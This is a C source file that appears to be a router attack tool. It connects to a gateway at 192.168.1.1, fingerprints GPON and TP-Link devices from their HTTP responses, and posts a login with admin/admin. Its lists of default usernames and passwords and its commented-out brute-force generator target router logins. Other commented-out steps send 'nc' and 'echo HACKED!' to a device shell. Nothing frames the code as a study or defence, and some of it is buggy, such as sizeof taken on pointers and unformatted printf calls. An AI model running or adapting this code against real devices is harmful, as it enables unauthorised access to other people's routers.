#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>

int main(int argc, char* argv[]) {
	int sockfd = 0,
		n = 0,
		connPort = 80;
	struct sockaddr_in
		serv_addr;
	char buff[1024],
		connAddr[] = "192.168.1.1";

	// HTTP Headers
	char** headers[] = {
		"GET /",
		"POST /GponForm/LoginForm",
		"XWebPageName=index&username=admin&password=admin"
		};
	int headerCnt = 0;

	// Recognize by
	char** recognizeList[] = {
		"GPON Home Gateway",
		"url=/login.html",
		"TPLINK"
		};

	// Vendor List
	char** vendorList[] = {
		"UNKNOWN",
		"CALLIX / Ericsson GPON",
		"TP-LINK 2010-2015"
		};
	int vendorCnt = 0;
	
	// Credentials
	char** users[] = {
		"admin",
		"root",
		"Admin"
		};
	char** passwords[] = {
		"admin",
		"password",
		"1234",
		"root",
		"Admin",
		"12345"
		};

	do {

	memset(buff, '\0', sizeof(buff));

	if (setSock(&sockfd) < 0)
		return 1;

	// set connection
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(connPort);
	serv_addr.sin_addr.s_addr = inet_addr(connAddr);

	if (setConn(&sockfd, &serv_addr) < 0)
		return 1;

	// BRUTE FORCE GENERATOR
	//char lox[] = "";
	//for (int i = 0; i <= (sizeof(users)/8)-1; ++i) {
	//	for (int o = 0; o <= (sizeof(passwords)/8)-1; ++o) {
	//		strcat(lox, users[i]);
	//		strcat(lox, ":");
	//		strcat(lox, passwords[o]);
	//		strcat(lox, "\n");
	//		printf(lox);
	//		memset(lox, '\0', sizeof(lox));
	//	}
	//}
	
	write(sockfd, headers[headerCnt], sizeof(headers[headerCnt]));
	write(sockfd, "\n\n", 2);
	// web part
	while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
		buff[n] = 0;

		// Recognize the router
		for (int i = 0; i <= (sizeof(recognizeList)/8)-1; ++i) {
			
			// First match
			if (strstr(buff,recognizeList[i])) {

				if (recognizeList[i] == recognizeList[1]) {
					headerCnt = 1;
					vendorCnt = 1;
					break;
				}

				if (recognizeList[i] == recognizeList[2]) {
					headerCnt = 2;
					vendorCnt = 2;
					break;
				}

			}

		}

		//if (strstr(buff,"d") != NULL) {
		//	write(sockfd, "root\n", 5);
		//}

		//if (strstr(buff,"Password") != NULL) {
		//	write(sockfd, "admin\n", 6);
		//	write(sockfd, "nc\n", 3);
		//}

		//if (strstr(buff, "Usage:") != NULL) {
		//	write(sockfd, "echo HACKED!\n", 13);
		//}

		// display on screen
		fputs(buff, stdout);
		printf("\n");
	}

	printf(vendorList[vendorCnt]);

	} while (vendorCnt == 1);

	return 0;
}

int setSock(int *sockfd) {
	return (*sockfd = socket(AF_INET, SOCK_STREAM, 0));
}

int setConn(int *sockfd, struct sockaddr_in *serv_addr) {
	return connect(*sockfd, (struct sockaddr*) &*serv_addr, sizeof(*serv_addr));
}
